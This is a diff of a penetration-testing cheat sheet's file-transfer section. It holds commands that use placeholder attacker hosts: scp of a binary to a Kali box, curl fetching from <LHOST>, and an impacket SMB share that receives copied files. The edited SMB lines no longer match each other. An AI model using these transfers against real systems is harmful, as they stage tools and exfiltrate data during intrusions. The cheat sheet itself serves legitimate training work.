@@ -430,12 +430,13 @@ ssh username@target_ip #enter password if you gave any
 ```
 
 ## File Transfers
+
 - Windows when you have GUI access on windows and need to get a file from windows to kali
-kali:
+```kali:
 service ssh start 
 
 windows:
-scp <binary> kali@<kali ip>:/tmp
+scp <binary> kali@<kali ip>:/tmp```
 - Netcat
 
 ```bash
@@ -465,7 +466,7 @@ curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ### Windows to Kali
 
 ```powershell
-kali> impacket-smbserver -smb2support <sharename> .
+kali> impacket-smbserver -smb2support share /tmp
 win> copy file \\KaliIP\sharename
 ```
 
